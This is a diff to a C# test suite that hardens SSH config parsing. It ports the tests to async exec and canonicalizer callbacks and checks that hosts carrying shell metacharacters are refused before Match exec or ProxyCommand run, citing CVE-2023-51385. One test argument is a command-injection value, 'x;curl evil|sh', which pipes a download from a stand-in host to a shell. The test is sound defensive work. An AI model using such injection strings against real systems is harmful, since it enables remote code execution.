@@ -12,8 +12,11 @@ public class SshConfigHardeningTests
         LocalHostName = "box",
     };
 
+    // Resolve when no callback is set, ResolveAsync otherwise (the tests' callbacks complete at once).
     private static SshHostConfig Resolve(string config, string host, SshConfigResolveOptions? options = null) =>
-        SshConfig.Parse(config).Resolve(host, options ?? Options);
+        options is { ExecMatcher: not null } or { HostCanonicalizer: not null }
+            ? SshConfig.Parse(config).ResolveAsync(host, options).GetAwaiter().GetResult()
+            : SshConfig.Parse(config).Resolve(host, options ?? Options);
 
     [Test]
     [Arguments("x;curl evil|sh")]
@@ -29,7 +32,7 @@ public class SshConfigHardeningTests
         // %h/%n go into Match exec and ProxyCommand, which run in a shell (CVE-2023-51385).
         const string config = "Match exec \"ping -c1 %h\"\n Port 5\nProxyCommand nc %h %p\n";
         var ran = new List<string>();
-        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", ExecMatcher = c => { ran.Add(c); return false; } };
+        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", ExecMatcher = (c, _) => { ran.Add(c); return Task.FromResult(false); } };
         await Assert.That(() => Resolve(config, host, options)).Throws<ArgumentException>();
         await Assert.That(ran).IsEmpty();
     }
@@ -48,7 +51,7 @@ public class SshConfigHardeningTests
         // file itself is trusted as written, as OpenSSH trusts it.
         const string config = "Match exec \"test %r\"\n Port 5\nProxyCommand nc %h %p %r\n";
         var ran = new List<string>();
-        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", User = user, ExecMatcher = c => { ran.Add(c); return false; } };
+        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", User = user, ExecMatcher = (c, _) => { ran.Add(c); return Task.FromResult(false); } };
         await Assert.That(() => Resolve(config, "a", options)).Throws<ArgumentException>();
         await Assert.That(ran).IsEmpty();
     }
@@ -68,7 +71,7 @@ public class SshConfigHardeningTests
     public async Task TheFinalPass_MatchesHostSectionsAgainstTheCanonicalName()
     {
         const string config = "CanonicalizeHostname yes\nCanonicalDomains corp.example.com\nHost *.corp.example.com\n User svc\n";
-        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", HostCanonicalizer = (h, _) => h + ".corp.example.com" };
+        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", HostCanonicalizer = (h, _, _) => Task.FromResult<string?>(h + ".corp.example.com") };
         var c = Resolve(config, "web", options);
         await Assert.That(c.HostName).IsEqualTo("web.corp.example.com");
         await Assert.That(c.User).IsEqualTo("svc");
@@ -144,6 +147,6 @@ public class SshConfigHardeningTests
         var command = OperatingSystem.IsWindows()
             ? "if \"a b\"==\"a b\" (exit 0) else (exit 1)"
             : "test \"a b\" = 'a b'";
-        await Assert.That(SshExecMatcher.RunShell(command)).IsTrue();
+        await Assert.That(await SshExecMatcher.RunShellAsync(command)).IsTrue();
     }
 }
